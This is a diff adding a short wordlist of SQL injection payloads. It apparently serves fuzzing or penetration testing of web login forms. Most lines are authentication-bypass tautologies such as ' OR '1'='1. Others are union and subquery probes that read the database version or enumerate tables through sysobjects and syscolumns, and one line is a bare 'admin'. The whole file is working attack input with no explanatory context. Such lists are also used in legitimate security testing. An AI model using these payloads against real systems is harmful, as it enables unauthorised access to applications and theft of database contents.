@@ -1,0 +1,17 @@
+'OR TRUE + '
+' + OR TRUE + '
+OR 1=1
+' OR '1'='1
+; OR '1'='1'
+' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = tablename')--
+' or 1 in (select @@version)--
+' union all select @@version--
+' OR 'unusual' = 'unusual'
+' OR 'something' = 'some'+'thing'
+' OR 'text' = N'text'
+' OR 'something' like 'some%'
+' OR 2 > 1
+' OR 'text' > 't'
+' OR 'whatever' in ('whatever')
+' OR 2 BETWEEN 1 and 3
+admin
